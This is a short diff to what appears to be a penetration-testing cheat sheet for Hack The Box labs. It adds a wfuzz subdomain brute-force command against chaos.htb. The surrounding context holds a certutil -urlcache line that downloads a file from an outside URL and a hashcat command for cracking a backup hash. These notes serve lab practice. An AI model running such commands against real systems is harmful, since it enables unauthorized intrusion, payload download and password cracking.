@@ -83,6 +83,14 @@ cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http:
 hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
+### wfuzz
+
+#### brute force subdomains
+
+```
+ wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1mil-110000.txt -u http://10.10.10.120/ -H 'Host: FUZZ.chaos.htb' --hh 73 --hc 400
+ ```
+
 ### Nmap 
 
 #### ldap
